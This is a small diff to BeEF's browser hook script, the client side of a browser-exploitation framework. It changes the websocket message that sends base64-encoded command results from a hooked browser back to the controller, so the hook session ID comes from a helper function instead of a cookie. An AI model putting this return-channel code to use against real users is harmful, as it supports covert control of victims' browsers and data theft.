@@ -92,7 +92,7 @@ beef.net = {
         }
         else {
             try {
-                beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid + '", "result":"' + beef.encode.base64.encode(results) + '","callback": "' + callback + '","bh":"' + document.cookie.split("BEEFHOOK=")[1] + '" }');
+                beef.websocket.send('{"handler" : "' + handler + '", "cid" :"' + cid + '", "result":"' + beef.encode.base64.encode(results) + '","callback": "' + callback + '","bh":"' + beef.session.get_hook_session_id() + '" }');
             }
             catch (e) {
                 //todo this is necessary because at start could happened that ws in not still up and the browser try to send back browser info via websocket and failed
